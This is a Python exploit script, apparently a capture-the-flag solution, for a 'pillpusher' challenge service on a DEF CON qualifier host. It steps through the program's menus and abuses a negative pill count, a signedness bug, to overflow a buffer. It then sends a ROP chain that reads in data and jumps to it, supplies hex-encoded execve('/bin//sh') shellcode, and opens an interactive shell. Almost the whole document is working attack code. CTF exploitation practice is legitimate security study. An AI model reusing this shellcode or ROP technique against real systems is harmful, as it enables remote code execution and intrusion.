from pwnlib import *

"""
cat flag
The flag is: Those DFs are interesting creatures.

"""

LOCAL = False

#####

pills = []

def c():
	return s.ru("-> ")

def add_pill(name):
	global pills
	pills += [name]
	s.send("2\n")
	s.send("1\n")
	s.send("%s\n" % name)
	s.send("1\n")
	s.send("2\n")
	s.send("magic\n\n")
	s.send("\n")
	s.send("\n")
	c()
	c()
	s.send("6\n")
	c()

def add_staff():
	s.send("3\n")
	c()
	s.send("1\n")
	s.send("staffname\n")
	s.send("99\n")
	c()
	s.send("5\n")
	c()


def add_patient():
	s.send("4\n")
	c()
	s.send("1\n")
	s.send(patient_name + "\n")
	s.send("y\n")
	s.send("magic\n\n")
	c()
	s.send("5\n")
	c()

def add_pharma():
	s.send("1\n")
	c()
	s.send("1\n")
	s.send("pharname\n")
	for p in pills:
		s.send("%s\n" % p)
	s.send("\n")
	s.send("staffname\n\n")
	c()
	s.send("5\n")
	c()

def choose_script_stuff():
	s.send("5\n")
	c()
	s.send("1\n")
	s.send("pharname\n")
	c()
	s.send("2\n")
	s.send("1\n")
	c()
	s.send("3\n")
	s.send(patient_name + "\n")
	c()


#####

ret = 0x40022f
rdi_flags = 0x0000000000401846
rsi_flags = 0x000000000040022d
rdx_flags = 0x0000000000407a98
read = 0x409353
buf = 0x0060d000

def pop_rdi(x):
	return pq(rdi_flags) + pq(x) + pq(0)
def pop_rsi(x):
	return pq(rsi_flags) + pq(x) + pq(0)
def pop_rdx(x):
	return pq(rdx_flags) + pq(x) + pq(0)

payload  = pop_rdi(0)
payload += pop_rsi(buf)
payload += pop_rdx(0x100)
payload += pq(read)
payload += pq(buf)


shellcode = "31c05048b92f2f62696e2f736851545f5057545e99b03b0f05".decode("hex")


#####

if LOCAL:
	s = Socket(("localhost", 5553))
else:
	s = Socket(("pillpusher_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me", 43868))

c()

pill = "B"*0x5c
pill += pq(ret)

patient_name = payload


add_pill("A"*0x90)
add_pill(pill)

add_staff()
add_patient()
add_pharma()
choose_script_stuff()

s.send("4\n")
s.ru("How many pills to add: ")
s.send("-1\n") # yay signedness issues!

for _ in range(3):
	s.ru("Add pill: ")
	s.send("A"*0x90 + "\n")

s.ru("Add pill: ")
s.send(pill + "\n")

s.ru("Add pill: ")

s.send("garbage\n")
s.ru("Invalid\n")


raw_input("> ")
s.send(shellcode)






s.interact()
